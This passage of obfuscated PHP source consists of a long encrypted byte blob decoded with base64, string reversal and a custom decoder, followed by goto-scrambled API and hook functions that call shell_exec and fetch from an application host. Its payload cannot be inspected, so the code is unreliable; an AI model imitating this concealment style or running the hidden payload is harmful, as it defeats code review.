db\xff\x8b\x8e\x82\x99\xe2\xe2\x23\x76\x4\xc9\x70\x15\xd5\x24\xe4\xd4\xae\x6\x17\xbf\x76\x41\x62"."\15\235\173\55\140\226\226\35\351\26\70\325\312\140\232\225\35\171\255\14\146\264\352\320\363\345\204\43\77\132\6\1\50\63\347\301\74\4\141\5\210\204\306\130\232\314\335\346\114\223\243\71\123\164\310\140\342\47"."\124\300\1\324\162\332\121\60\312\16\60\373\301\377\143\46\50\16\374\346\201\54\222\207\22\172\36\210\352\145\55\101\331\16\124\52\166\151\5\370\124\4\174\110\301\65\6\217\356\34\123\11\327\225\370\131\164\362"."\x56\x99\x61\xe2\xbf\x65\x3\xe\xeb\x84\x4d\x92\x43\xb5\xb8\x60\x7f\xf1\x1f\xb3\x8\x5b\x59\x38\x59\x28\x9\xd7\x16\xed\x61\x84\x19\xb9\xd0\x45\x5a\x81\xa5\x44\x98\xe0\x60\xf2\x27\x47\x23\x99\xe1\x8d\x4d\x32\x9e\xd3\xb4\xd1\x52\x51"."\140\5\70\25\357\262\15\327\160\103\343\352\306\21\27\237\336\137\206\211\213\375\62\54\304\30\4\44\336\63\30\35\245\307\277\270\212\344\113\102\6\141\17\311\371\46\347\227\253\105\176\271\232\60\273\21\213\360".base64_decode('aycOxnVhAuwEehZKfiu47rAO9ozivKqyeyAiF2XGxADYsFSETb4vwLKxeQtzt7DoPFu8LTvhCjAaFA==')."\34\256\340\347\172\62\253\322\173\51\164\101\302\5\377\122\201\156\15\224\224\40\357\203\14\271\224\256\24\204\67\216\100\213\300\16\15\172\227\141\40\320\211\374\41\23\370\325\126\267\33\153\231\303\355\370\2\150"."\367\65\267\205\160\12\131\120\340\322\230\0\203\346\22\16\366\364\5\273\74\310\137\104\274\67\110\37\5\157\157\357\60\304\13\264\54\40\47\47\250\107\206\75\276\71\44\353\120\115\302\21\45\72\202\22\111\225".strrev('LzpôI56‡<\'!¡¡¤ãÑ†l=ÃÕ80HCŸ¯AóÑ `Üø+Ú0g¸¡½BGcfÇ#»´')."\x94\x20\x9f\xcc\xb7\xd7\x8c\x6a\xa9\x64\x4e\x2b\xa5\x6a\x78\x81\xee\x46\x57\x83\xd4\xd2\xd0\x28\xd\x16\xa8\x2e\x29\xdd\x3d\x85\x74\x39\x93\x97\xe1\x1b\x94\x4e\xe1\x89\x4a\x2f\xc\x3a\xbd\x58\x4f\xc5\x9e\x68\x79\x86\x99\x7e\x1c\x27"."\201\255\6\240\72\141\103\35\54\53\272\140\30\101\137\26\47\277\375\301\305\104\261\331\33\14\221\343\205\376\105\114\333\305\247\24\251\114\355\255\170\262\32\51\350\214\347\163\13\230\372\217\160\150\332\346\153\55"."\xea\x5a\x31\xad\x16\x52\x12\xc0\x29\x18\xad\xbe\xf6\x1a\x9f\x67\x71\x6b\x4d\x7\x48\x92\x73\x39\x98\x2a\xb9\x3b\xda\xdc\x1c\x91\x8c\x58\x28\x1c\xc\x75\x7\x98\xb7\x8d\x10\x1c\x2\x72\x7a\x86\x95\xaa\x9d\x7e\x32\x71\xc8\xa7\x2c\x2a".base64_decode('8TWgp2u4SnwNqlONRJ0CIiMjHGxsIk4rRRNgolQKTeuEfoBRZoiDCMTnh04VBPLIskNym/UHBhKrxA==')."\x5e\xd1\x2a\x11\x74\x4\x5c\xbe\xe0\x3d\x3c\xec\x55\xd8\x31\x49\xa8\x94\x84\x26\xd\xee\x1a\x4b\x3a\xcb\x95\x51\x4c\x72\x5b\x8b\xe0\xb0\x76\x29\x37\x5c\x96\x9c\x29\x55\x57\x90\x1f\x1c\x98\xd9\x86\x56\xf5\xa3\x54\xb7\xa\x39\x64\x10"."\x9c\x36\x96\x84\x49\xae\x8\x46\xd4\xdc\x0\x3c\xc1\x6c\x32\x40\x91\xe8\x3a\xcf\x36\xd0\x24\x1a\x69\xaf\x21\x56\x8b\x74\x5e\x40\x5e\x59\xd3\x81\xd9\x62\x5b\xa4\x55\x19\x87\x83\xa\x9a\xdc\x11\x44\xcf\x83\xf\x68\x26\x52\xae\x6a\x73"."\213\151\0\221\150\361\166\260\341\202\30\24\210\212\203\255\106\125\351\260\22\55\334\316\267\112\354\155\167\116\261\45\63\115\10\166\261\254\117\264\112\125\336\210\317\125\125\233\67\121\211\204\211\365\107\253\116\132".base64_decode('aF0FqtZ+0tyWhgZHvmSYTl2xvtULO0oix4v9ESee2M7FKuAHPmosjpwvtEpkIjgkOj9wKOSJensdEg==').base64_decode('IlaH1OOPAvAg+IONFhwSnNcgGcxzhwRNtR3S4AD+5WrooO8wWSAzItSVIA4pmhKNm0RJEpyxUAmH9A==')."\x3a\x6\xd0\x11\xcd\xb7\xe\xa9\x85\xe6\x26\xa8\x85\x8e\xd\xa5\xe0\x36\x9e\x10\x3\xe0\x8e\x25\xbd\xd0\x8a\x5d\x46\x19\xce\xbc\x9a\x4\x8b\x3e\x58\x70\x9d\x80\x24\x5a\xa1\xa6\x9f\xb5\xc\x7a\xcf\xf9\xff\x2f\x1\xd6\x82\xaa\xc2\xff".strrev('³€×Ó.JFÚ±ÄY'."\0".'¼&NÑrRFˆ"à¤š”hUdKÊÂ®±Á”Uÿ©’‰2,*Kÿ').base64_decode('cJKphSJ14okYFRj48FCY+cvTrMtB1MKtScNSlFOT0YZa/Cm4BwF5J1g74NpeVmAa7SyMiVlZqhV9BQ==')."\163\61\6\266\40\202\2\61\46\230\344\271\222\1\12\343\330\70\215\241\247\340\72\324\241\26\340\343\301\46\342\155\30\302\20\264\261\202\102\47\75\314\17\55\11\335\10\350\346\214\31\346\303\210\54\37\161\172".strrev('=«D+ÀTpo¢ŒçÉ¾.‘–ºYbŒzØ™Fma,ÛVğaIeyEhVtcv‚­¬Â…+EÀÚ').base64_decode('WzsBPylXsOQKWoADOiVPnHIR/8KVFev60oUVERsOLnH6x4ugjkoKrNRgPz9hMUl2L8M2J/hWr77OSQ==').strrev('ïrŠ²4 ¹9ŠÆ’^ğY¤İ´,‰iá§K[MÚ5M»zó\\$«'."\n".'L"™hÊî"¹WÌ')."\x62\x31\xe3\x62\x6b\x46\x86\x4a\x93\x85\xa3\x77\xb1\xea\x71\x2c\x28\x13\xc8\x78\xbc\xa8\xe4\xf0\x59\xa\x32\x88\xa3\xf0\x89\x29\xe0\xc9\x9c\xe\x9d\xd2\xa5\xc4\xb8\x9a\x87\x37\x90\x32\xab\xa4\xe\x24\x7a\xc0\x8d\x46\x29\x4e\x46\x57".base64_decode('lIIFksiVFAtAzhWzMoJgAHnjw5twezNur+72kp34vviHPAPnJasWcbdFXwZBDcQbbeifJ0PflbDB4Q==')."\126\241\152\102\221\112\165\143\134\241\47\53\250\332\300\63\313\70\264\17\212\363\243\215\212\113\44\124\146\130\63\331\62\53\174\4\336\200\243\213\16\302\54\370\343\261\20\47\235\243\132\141\201\376\236\170\167\137"."\40\24\107\373\200\340\100\324\323\147\113\0\214\65\32\360\126\200\273\202\324\137\260\255\151\211\274\125\153\115\55\40\131\40\304\335\21\201\250\154\60\177\271\304\15\45\311\3\315\13\160\160\101\133\102\167\123\153"._kodDe('MnC5F5zeHnpeMRWVpae2FMcl/aRu1Zx899L1ZxIqsC0hinlpqG6TLBIPO5ytqBPngPJfPRVkOwB2c4Q=')."\x38\x20\xa4\x3e\xf1\x16\x2c\x5c\xb8\x90\x3e\x7\x9b\xcc\x61\x33\x4e\x68\x66\xc0\xee\xdc\x1\x14\x9e\x60\x29\x95\x50\xb9\x12\x13\x6a\xf1\x21\xdb\x27\xcb\x9d\x7d\x58\xd6\x3d\xb8\x5\x55\x12\x4f\x55\x8b\x53\x24\xaa\x45\xfa\x98\x67\x91"."\152\272\27\113\364\102\234\35\311\11\176\205\346\221\137\372\130\110\142\222\320\276\254\23\375\203\244\114\362\253\6\71\143\313\114\102\365\71\32\6\313\121\216\237\205\42\275\344\21\311\53\27\146\231\122\20\240\55"."\x90\xfa\xa1\xc1\x53\x21\x23\x4d\x82\x96\x63\x1f\xdd\x6\xf7\x4e\x62\x64\x95\x5c\x2e\xe\xd5\xe6\x48\x75\x93\x59\x4d\xb2\xef\x32\x69\x74\xea\x6f\xf0\x62\x8\xb8\x44\x75\x3e\x20\x87\x5\x15\x24\x33\x8f\x4c\x77\x41\x63\x80\xbb\xdd\x20"."\206\207\56\27\121\4\202\336\32\0\307\261\42\41\257\247\324\15\3\72\172\210\3\146\50\70\307\204\342\224\4\327\37\144\111\141\361\267\263\110\113\221\141\153\305\116\166\122\312\370\2\11\171\220\42\236\326\253"."\x3b\x6d\x42\x9f\x91\xc0\x67\xa0\x49\x99\x84\x8d\x81\x2d\x4a\x86\x18\xa1\x2\xd2\x6a\xd1\x55\xc4\x9\x95\x15\x9e\xd1\xd0\xd8\x20\x58\x85\x4\xbc\xfe\x48\xfc\xe4\x8\xf4\xb3\xda\x17\xa0\xfe\x7b\xac\x9\x1\x90\x16\xd\x4f\x91\xe2\x9"."\117\225\22\354\72\171\212\24\57\335\144\130\123\372\202\301\210\350\52\312\126\275\301\220\340\134\222\154\242\341\2\117\137\163\31\30\354\43\374\53\106\50\70\106\30\266\227\250\110\305\112\63\32\132\250\301\20\177".strrev('z±V,"óôİvk­wnÑ¯B\'÷e5'."\0".'É;XYc ¤ è°P“Xle%,8q¶†°á»x\\MöŞ')."\367\211\203\244\32\47\162\30\100\230\316\340\356\145\265\65\253\147\325\271\352\153\143\215\165\114\5\54\106\255\321\142\261\22\121\240\32\131\325\262\206\373\260\214\15\273\352\143\43\323\5\215\264\125\0\260\206\1"."\xc6\xb2\xf4\x4c\xd\x79\xcf\x60\x58\x46\x7d\xed\x70\xcd\xac\x11\x57\xfd\xf0\xb2\x58\x6c\x4\x6\xeb\x0\xac\x15\xc2\x63\x11\x57\x7d\x9d\xa3\x73\xba\x7b\x50\x35\x44\x7c\xec\x89\x7b\x4a\x1c\xd2\xe5\xd4\x1e\xad\xc8\x2e\x8\xa0\x5c\xa3"."\202\255\24\262\306\20\165\162\103\176\300\224\5\367\173\146\276\50\220\55\76\213\23\225\333\61\204\56\51\45\272\366\241\40\65\0\53\162\45\177\253\102\56\213\132\146\113\203\324\5\344\71\213\345\265\305\107\240"."\120\73\175\266\120\120\134\164\301\211\40\342\53\57\60\56\274\246\53\324\25\10\165\202\143\31\130\20\365\306\104\244\5\331\310\116\341\211\10\73\5\1\15\20\352\204\375\113\302\123\1\141\241\355\265\271\365\42".base64_decode('e63KPsRhQMhkaiE88Cm0+aG+Urhe+ViC9ADs47jtg8ysOyfsWX1WGYZrctEolaOSchHe+aTw6TroeA==')."\362\155\26\32\14\101\147\172\220\23\304\351\101\253\0\12\14\4\342\221\300\251\376\212\4\350\123\272\172\12\130\357\243\1\52\376\10\360\201\40\362\137\147\201\17\16\54\32\10\16\125\103\215\366\207\270\54\41"."\44\171\75\3\321\270\260\161\305\73\32\260\57\143\133\32\252\364\236\324\223\315\115\11\66\315\230\137\67\52\360\223\231\102\327\174\356\216\141\334\311\154\0\350\246\310\307\275\253\220\154\350\164\226\124\1\371\232"."\x21\x19\xc4\xa3\x1e\x31\xd9\x21\x55\x3d\xe8\x61\xbb\x2e\x62\xc\x62\x3b\xc3\x4c\xa8\x5\x99\x7a\xc5\xcd\xd3\x6f\xe7\x99\x45\x1d\x74\x38\x45\x9d\xf4\x20\xeb\x37\x2a\x19\x88\xf7\xdf\x45\x76\x89\x48\x4c\xce\x74\x90\xaa\x23\x43\x70\xe1".base64_decode('YK9ghpWMGO3TmN4fWs2rFAFfVRKMVeBOxpM0S+KLTdzcHMZ6uHtXwdTP2SixFsVxyTgyW0jA2uZVzA==')."\x5\x6d\xde\x16\x4\xe7\xb0\xc8\xf2\x3c\x52\x4a\x30\x5f\x3a\x36\xfb\x3e\xea\x7a\x56\x12\x2d\xeb\xa8\x3\x59\x58\x0\x7a\x70\x8\xb6\xc0\x10\xd3\x40\xb1\xf0\xf5\x6c\xde\x32\x31\xb\xfa\x66\x45\x16\x9c\x6\xd\xe0\x38\x2b\x13\x53\xc"."\250\324\65\110\305\256\152\51\125\76\205\222\204\36\115\322\315\36\365\217\107\72\211\367\225\111\373\273\311\111\137\61\23\75\320\22\363\71\322\271\316\46\111\40\57\310\173\4\212\300\107\26\254\33\271\101\150\216"."\xe3\x68\xd0\x4b\x84\xc2\x7\x9f\x1b\x1c\xe2\xd7\x90\xd8\xd0\xa2\x67\x93\x58\x4c\x17\x8c\xd1\x94\x14\x1d\x3a\xf4\xec\x50\xd5\xb5\x4\x3\xd1\xbb\x44\x83\xd5\xd2\x71\x67\xc1\x64\x9f\xc5\x55\xa8\xd\x1\x4c\x79\x6b\x3a\xfa\xa2\x58\x99".base64_decode('NH6DyuIy0VaIjtN8CndggnLxdnCvqwAE9j7otRveMdwfHn5nifqG9aRSdnBUY8BKn3ou5tWWuO8Hmw==')."\322\110\40\70\120\133\7\245\54\213\337\201\376\11\346\140\35\214\44\132\307\373\345\161\76\120\54\102\123\31\235\32\226\10\166\123\151\311\315\100\14\153\114\111\60\266\115\30\151\157\310\315\100\135\264\233\330\173"."\x3a\xc4\xd8\x1a\xbe\x66\x20\x16\x1a\x24\x32\xeb\x18\xb6\xa2\x22\xbc\xb4\x95\x79\xee\xa4\x5b\xa2\xb1\xbc\x9a\x94\xfa\x82\x3d\x70\x3f\xee\xb\x44\x16\x49\x19\xc5\x94\xb8\x20\x84\x6e\x37\xac\x33\x1f\x39\x8d\x40\xa7\x81\x94\xf0\x13\x54"."\65\6\5\235\350\344\304\151\161\117\304\166\51\242\113\117\130\120\105\301\170\324\305\342\340\261\213\63\305\214\157\155\270\124\160\250\310\41\176\137\310\3\167\71\126\136\201\300\144\377\143\55\147\102\201\27\10\325".base64_decode('v12q8l2Cn+OHLkIGtVBWDZWzAdpVEyJ+RV+ipggI0IkZt0hn3cq+U2EpzeMYh7zXJtjk4iER3y0sUg==')."\x47\x35\xe4\x6a\x9e\x8e\x3f\x89\xa\xb7\xdc\x45\x5d\x56\xd\x45\x0\x58\x5e\x35\x24\xf8\x71\x8c\x85\x61\xe1\x40\x4f\x6f\xf4\x3f\x2e\x4e\x4d\xf1\x17\xa\x6d\x95\x51\x53\x54\x4a\x64\x3e\xc3\x81\x6c\x88\xca\xc3\x1a\x3f\x96\x2a\x40\xa5"."\6\316\37\2\76\7\172\112\216\73\241\105\101\40\107\72\340\261\26\252\200\103\170\162\13\335\40\223\251\243\152\310\370\225\330\174\142\130\40\30\307\357\146\341\250\333\56\32\247\221\41\51\262\114\22\334\40\271"."\351\171\44\363\41\16\217\245\375\324\51\217\313\244\41\10\346\126\253\334\237\54\165\252\13\213\42\237\206\165\303\226\314\252\206\36\376\240\26\257\304\12\237\65\17\107\355\136\170\263\242\64\135\121\26\224\265\247"."\x2e\x7\xe4\x93\xb8\x91\x3f\x43\x90\xda\xa5\x6\xe4\x2b\x82\x7b\x53\x95\xda\xe8\x9b\x6\xfc\x13\xe8\x61\x3a\x7f\xbe\x48\x1f\x4\xc5\x46\xd9\xbd\xaa\xc1\xdf\x26\x41\xc2\x6\xdf\x54\x41\x9\x4e\xcb\x4f\x54\x0\x2c\x56\xff\x7d\xb4\x1a"."\314\251\53\64\150\51\244\65\261\325\210\311\371\1\63\161\240\20\66\366\166\300\103\161\63\204\110\252\117\51\53\326\354\123\226\145\330\127\7\56\264\0\56\0\315\123\270\206\64\205\10\42\212\205\337\242\210\100".base64_decode('ushcVngAgP5CjzxMlIX1FQokRlYx8ktZq71oMIBeosRCaR5GKxL7Fa41R+rqsK0W0AmeXGAsCg4jQA==')."\302\316\220\100\200\117\53\232\46\120\15\363\73\305\66\252\310\371\54\73\260\6\213\166\24\260\270\214\3\213\35\220\71\360\130\327\204\30\26\275\372\242\172\105\231\155\216\232\142\43\44\136\342\73\151\52\124\111".base64_decode('oyyCUy1OFaiY8R0xN7YICGM3mS7sewSn6GD3wHzhWtAI1wA7rCm95BBRAHvMKRUC+PkGC1QXdieiXw==')."\x65\xec\x1b\x88\x7b\xc6\x27\xe8\xe0\x6b\x21\xec\xc\x88\x34\x5b\x2c\x92\x3a\x64\x42\x3f\x70\xff\x2\x26\x2a\xb3\x24\x77\x57\x3a\x70\x82\x6e\x3c\xa9\x64\x21\xb8\xbd\x25\xde\xb4\x5c\xe2\xf6\x81\x20\x48\x6d\x12\x1f\x60\xcb\x4\x82\xd2"."\31\20\334\34\50\200\146\245\50\143\126\207\132\146\45\102\141\44\207\136\16\145\324\7\173\224\374\370\224\64\223\276\141\234\157\323\304\307\153\150\23\60\261\127\174\3\375\102\276\350\300\155\164\60\202\127\215\76"."\244\341\151\104\260\54\352\200\267\243\340\7\357\47\14\7\177\353\300\201\157\72\220\131\221\235\334\162\334\205\26\350\161\376\175\130\341\250\130\27\213\14\154\27\177\131\247\331\62\204\355\35\33\325\52\75\135\160".strrev('ÑZ“‚örúHÉ7¥¥û½*°iè™B›ˆuw[GQô“ôÎzKBÁ¢ vë'."\n".'{R…V')."\xcd\x50\x75\x34\xd5\x42\x99\x60\xfb\xcd\xcf\xdc\xf1\xeb\xb4\x45\xfb\x1a\xb1\x34\x9f\x6a\x6a\x9e\x33\x5f\xdc\x70\xf3\x91\xe3\x4e\x88\xe8\xdb\xed\xf8\x87\x9e\x2d\x32\x5a\x90\xac\x94\x26\xd1\x27\x71\xc5\xb9\x8d\x12\xad\xde\x9e\xc9\x23"."\306\2\157\267\361\340\377\150\102\170\252\311\346\70\223\160\4\310\112\26\272\240\332\127\376\377\365\300\161\52\177\103\107\271\74\146\165\143\107\66\331\74\131\220\260\305\275\0\30\15\17\233\122\146\66\130\310\115"."\330\233\214\237\170\375\317\53\115\305\145\331\352\304\14\245\162\131\1\62\20\372\145\172\56\236\261\255\374\130\334\20\306\126\70\35\122\314\40\364\151\100\106\136\330\200\201\24\13\232\260\372\203\30\23\174\370\253"."\154\260\142\264\46\123\354\230\350\334\345\325\101\157\74\160\327\51\210\114\55\44\53\274\266\54\76\231\200\12\212\12\56\45\53\213\106\133\166\122\111\102\263\110\51\2\371\27\364\364\260\127\60\340\135\60\257\2".base64_decode('jHHeZGo8xdSsD/EE6cEnEB8suwMQ58ZnwsxL2YCibCXMZDDDVEHCJ8Iql/5QQwW3UORUgfeUh0kc4g==')."\33\323\40\312\250\216\254\52\144\356\43\137\324\370\263\302\242\301\327\7\36\32\240\366\31\60\42\234\251\41\31\232\45\146\105\361\32\76\44\206\103\124\130\144\265\100\174\256\332\4\300\225\200\324\107\126\56\24"."\244\274\25\52\160\43\273\151\230\207\364\236\225\127\240\6\175\301\362\7\213\143\276\320\173\210\24\147\253\234\225\223\37\54\246\22\242\162\130\142\44\302\245\126\244\11\57\334\310\241\70\363\155\113\37\204\243\357"._kodDe('Lbq1Nr3lALVemGe16ZF/Y9XGbRAButtVFvbOXHmVxdGvNpu6NbumeScVO/KtJvZLKui23QSZaxb3XSE=')."\x61\x99\xab\x40\xe3\x3c\x4\xac\x86\x4c\x7d\x91\x86\xd0\x76\x0\x8a\x48\x44\xce\xb5\xbc\x8e\x12\x64\x37\xf6\x75\xc4\x6f\xe0\xc8\x42\xca\xb\xe0\x4\xa4\xc7\x7e\x22\x1b\xb0\x80\x2a\x98\x47\xd4\xb2\x72\x58\x80\x62\xf7\x10\x22\x80\x2f"."\xf\x50\x7a\xb0\xe4\x80\xbe\xa2\xba\x4\x19\x1c\x23\x19\x62\xdf\x5a\x4e\x2b\x2b\x5d\x81\x55\xe6\x66\xd3\x51\xcc\xc2\x17\xf\x1c\x87\xef\x6f\x5b\xcf\x8\xc4\xa2\xf1\x2d\x3b\xdc\xb9\x86\xe1\x26\xd3\x65\x2b\x9e\xcd\x9f\xaa\x73\x46\x35"."\xf0\xe9\xa9\xb8\x93\x2\x21\xb1\xa2\x74\xd2\x85\x74\xd\xc9\x2\x56\x28\x5b\x11\x4\x8b\x31\x41\x5d\x2b\x62\x67\x5b\xb6\x13\x5d\x20\xbc\xb\xb7\x1d\xf8\x45\x55\x55\x43\x4a\x9\x9e\x88\x4\x98\x97\x14\x19\xec\xaf\x45\x2e\xe4\x21\x0".base64_decode('BvCrfMuJaLJcOkQS/sNvM9bCZFjIcikwwF/HrpP4m4I4nVAvEGa7NUYH8PZWUPSxPogBfVVb50BHNQ==')."\264\244\246\33\2\232\360\344\313\51\320\265\77\16\366\253\5\372\16\13\41\155\232\235\214\4\216\125\53\37\14\174\304\264\14\21\224\346\250\10\11\204\144\211\17\50\332\375\341\15\235\145\137\107\24\240\104\220"."\x70\x9d\x3\x4d\x1\xac\x1e\x7a\x51\x22\x2\xd3\x57\x58\x49\x9\xc2\x2d\x84\xf5\x3e\x88\x3d\x64\x5f\xc1\xb7\x4a\x6a\x9f\x90\x8c\x72\xd1\x7\xfd\xc0\x2f\x7c\x2b\x23\xc0\x5d\x69\xa0\x64\x7c\x46\xea\x29\xcb\x4c\x39\xc8\x9e\x6b\xd0\x22"."\32\13\267\107\111\104\220\174\313\202\62\46\100\55\321\37\117\121\265\347\60\263\252\236\352\122\13\51\73\176\251\220\140\120\216\16\6\243\253\32\30\210\125\234\165\333\340\302\52\303\231\247\134\346\67\11\134\40"."\115\245\272\345\162\25\124\146\370\316\240\0\302\120\221\34\44\74\351\303\135\73\53\143\342\327\11\136\272\162\215\201\210\225\120\376\344\217\275\135\150\32\61\70\271\320\51\10\16\362\10\271\161\20\302\111\62\337"."\x89\xb8\x28\xe8\x28\xdb\x5\x75\xb\xb9\x53\x45\x5c\x47\xb6\x95\xe4\x9f\xb4\xbe\x4c\xc4\xd0\x98\x8c\x6\x70\x90\x8d\x80\xd3\x2\xb5\x79\x97\x86\xa7\x8b\x74\xb5\xb5\x25\x91\x7d\xac\x50\x7c\xd5\xed\xae\x85\x14\xfa\x84\xe2\xc4\xfb\xa3"."\x29\x33\x44\xaa\x7f\x84\xd3\xab\xb5\x8b\x85\x57\x9c\x78\x2\x5d\xd4\x34\x4b\xe7\xb\xbc\x95\x35\x8c\x60\x86\xc5\x44\x4b\x75\xec\x43\x8b\xf6\x12\x9c\x2e\x31\x30\x8f\x8e\xee\x70\x9a\xc7\x9a\x84\xf1\x15\x5b\xed\xc5\xc\xf6\x96\xe1\x1c"."\x7a\x45\xff\x90\x3c\xd5\x3f\x6d\xff\x0\xed\x1e\xfb\xed\x2d\x2f\x44\xd8\xca\x54\x5c\x2d\x47\xb5\x2a\x79\x70\x8d\xaa\x66\xc3\x49\x30\x27\x97\xda\x2c\x79\x8d\x31\xd5\x4c\x66\xab\xe6\xc5\x49\x30\x6f\x45\x32\xcd\x2c\xec\xca\x85\x7c\xa6".base64_decode('XDKmaF5l56FpZOs60mDuAl5Anao/qyJXfo4Qjx0b7aar16LqqcBUtaiKPGUtOLbtxrgaP6QpVTggvw==')."\xe0\xad\xe4\xb5\x3c\xad\xca\x75\x33\x2e\x13\x2e\xc4\x61\x8b\x46\x66\x45\xb2\x78\x77\x5d\xfd\x76\x3b\x5c\x75\x16\x1b\xd6\x6b\x67\x1b\x5c\xec\x18\xee\x92\x93\x38\xe9\x1c\x2d\x50\xaf\x56\x20\x3b\xf7\x16\x9\x15\xb9\x3d\xba\xbd\x73\xa8"."\154\147\363\277\114\151\257\120\22\174\376\126\165\340\354\200\333\337\312\375\145\216\372\74\23\335\133\343\235\210\146\252\111\101\315\5\2\105\17\315\70\235\176\44\307\17\312\210\44\200\157\52\175\242\326\366\253\167"."\x9e\xb5\xf7\xee\x1b\xf6\x6e\xb9\x6a\xef\x5\x67\xef\xbe\xf0\xa7\x8e\x3d\xeb\xae\xdb\xb3\x69\xed\x9e\x4d\xeb\x77\x9f\x73\xd5\xee\x4b\x6f\xc4\x9\x7b\xae\x38\xf3\xb5\x4b\x2f\x58\x20\xed\x59\xfb\x3\x98\x78\xf1\x8f\x76\xdd\x73\x27\xfe".strrev('Éó^8ÍÅ¬‘ø»¤«XnZ=Î·¨'."\n".'t&?år\\ö»ãóÜn½ºõ½^;­÷e-Îïw¹n¯Úû»')."\xa9\x34\xbe\x3c\x42\xaa\x4e\xec\x42\x2\xee\xd0\x1c\x78\x29\xc5\xc9\x11\x4d\x37\xa1\xfb\x0\xb0\x4\x14\xd1\x6f\x97\x66\x9a\x94\x33\x1\x39\x1a\x61\x22\xc9\x10\x79\x27\x12\x2e\xd1\x41\x88\xdf\x3e\xc0\x41\x43\x7\xe2\x88\xbc\x11\x1b"."\102\101\162\215\5\167\263\21\5\247\42\346\145\211\300\203\166\26\11\127\236\250\167\227\154\367\146\34\0\366\241\11\155\234\120\27\172\322\210\327\7\236\210\223\156\261\113\177\374\345\12\102\336\242\112\0\322\315"."\x33\xdc\x38\xc5\x4d\xf4\xf8\x9d\xa8\xc\x27\x79\x7c\x93\xe9\xf1\x91\xec\x29\x34\x1d\x99\x7f\xd3\x2f\x2a\x81\x1c\x11\xf2\x22\xf0\xcb\xf1\xe8\x98\x69\x20\x18\x8d\xfb\x97\x4\x22\xd1\x48\x45\x52\xc8\x13\x89\xc\x5\xc3\x3e\xac\xb\x5c"."\221\214\162\11\372\27\25\111\241\336\340\300\124\151\376\176\117\240\257\42\15\352\143\100\15\145\372\76\54\116\12\204\120\55\75\175\175\124\41\260\262\26\1\357\42\136\23\164\137\310\317\201\213\131\215\36\253\332"."\x94\x95\xe8\xb1\x79\x44\xa6\xf3\x4f\x7c\xfa\x44\xc9\xb3\x63\x2e\xa1\x8\xeb\xa1\x83\x38\xcc\x6\x7d\xb3\x98\x5\x8a\x15\x9b\x12\x41\x9e\x80\x3a\x13\x3\xa4\xb0\x30\x75\xdd\x39\xe0\x3f\x85\xf3\x12\x26\x20\xa3\x6\x89\xa\x59\xfc\x46"."\xd4\x65\xb9\x39\x15\xe0\x68\xb2\x20\x8e\x26\x10\xa1\xb8\x5a\x23\x0\x51\x20\xb6\xdd\xf2\xd8\x3a\xb0\xf2\x9e\x96\xce\x51\xfb\x25\x31\x4c\xe5\x9d\x3\xdb\x70\x32\x75\xe3\xb1\x42\x4b\x8\xd7\x48\x98\x1\x5a\x58\x9f\xa8\x1\x83\xc3\x24"."\371\377\0\34\147\351\102\357\306\0\0".""."".base64_decode('').strrev('')."", 10, -8))); goto d®‹¶êãœ¯; f’ñ×É‡¾â: function ActionCall($aİö“¥Óê‰) { $eì¿¹ßÚî¸ = array_slice(func_get_args(), 1); return ActionApply($aİö“¥Óê‰, $eì¿¹ßÚî¸); } function ActionCallApi($fâÁ÷¬øÅ¤, $A•Âƒ‡‚‹ä = '') { goto f»éµŠŞªæ; eÜŠ•’È¼æ: $CÏ…¦ßÍğ = json_decode($Eäîò‚éµ, !0); $cá˜æ´Ï¹Á = is_array($CÏ…¦ßÍğ) ? $CÏ…¦ßÍğ : array($cù½Ö«áø[29] => null, $cù½Ö«áø[30] => $Eäîò‚éµ); if (!$CÏ…¦ßÍğ) { echo $Eäîò‚éµ; } goto eñƒÔ½»•å; A‹­Óæƒ–: $dáöâïÓ±³ = Action($cù½Ö«áø[19])->accessToken(); $fâÁ÷¬øÅ¤ = str_replace($cù½Ö«áø[5], $cù½Ö«áø[4], $fâÁ÷¬øÅ¤) . $cù½Ö«áø[20] . $dáöâïÓ±³ . $D¿­ŠËË¿Ş; $Eäîò‚éµ = $cù½Ö«áø[16]; goto EÜÃ©ŠÇ; EÜÃ©ŠÇ: $CÜÏ¢öÙğ = phpBinCommand(); if ($CÜÏ¢öÙğ && function_exists($cù½Ö«áø[21])) { $Aµ°ğ¹ÀÔ— = $CÜÏ¢öÙğ . $cù½Ö«áø[22] . BASIC_PATH . $cù½Ö«áø[23] . escapeshellarg($fâÁ÷¬øÅ¤); $Eäîò‚éµ = shell_exec($Aµ°ğ¹ÀÔ—); } if (!$Eäîò‚éµ) { $A©óñÒ§‹‚ = stream_context_create(array($cù½Ö«áø[24] => array($cù½Ö«áø[25] => 20, $cù½Ö«áø[26] => $cù½Ö«áø[27]))); $Eäîò‚éµ = file_get_contents(APP_HOST . $cù½Ö«áø[28] . $fâÁ÷¬øÅ¤, !1, $A©óñÒ§‹‚); } goto eÜŠ•’È¼æ; f»éµŠŞªæ: $cù½Ö«áø =& $_SERVER[ïÚûó†Îá]; $D¿­ŠËË¿Ş = $A•Âƒ‡‚‹ä; if (is_array($A•Âƒ‡‚‹ä)) { $D¿­ŠËË¿Ş = $cù½Ö«áø[16]; foreach ($A•Âƒ‡‚‹ä as $FŒ…¬é‡ £ => $bğÉ¬ƒ¢–Ş) { $bğÉ¬ƒ¢–Ş = is_array($bğÉ¬ƒ¢–Ş) ? json_encode($bğÉ¬ƒ¢–Ş) : $bğÉ¬ƒ¢–Ş; $bğÉ¬ƒ¢–Ş = is_bool($bğÉ¬ƒ¢–Ş) ? intval($bğÉ¬ƒ¢–Ş) : $bğÉ¬ƒ¢–Ş; $D¿­ŠËË¿Ş .= $cù½Ö«áø[17] . $FŒ…¬é‡ £ . $cù½Ö«áø[18] . rawurlencode($bğÉ¬ƒ¢–Ş); } } goto A‹­Óæƒ–; eñƒÔ½»•å: return $cá˜æ´Ï¹Á; goto a¹“ÜÓáó»; a¹“ÜÓáó»: } function ActionCallHook($b¦°³¡ ½©) { goto fÕ¿‰ÄáóŒ; fÕ¿‰ÄáóŒ: $aŒˆ‹²ÔŸ› =& $_SERVER[ïÚûó†Îá]; ob_start(); $fŒàßÍ†šº = array_slice(func_get_args(), 1); goto a‹ì¹Á›åÂ; bïùÆ ìë¬: $aŠ›¶ôÊ÷Î = $Bä¨ÜÛñ ? json_decode($Bä¨ÜÛñ, !0) : $aŠ›¶ôÊ÷Î; $GLOBALS[$aŒˆ‹²ÔŸ›[31]] = 0; return $aŠ›¶ôÊ÷Î; goto Fö§Ñ„¾±; a‹ì¹Á›åÂ: $GLOBALS[$aŒˆ‹²ÔŸ›[31]] = 1; $aŠ›¶ôÊ÷Î = 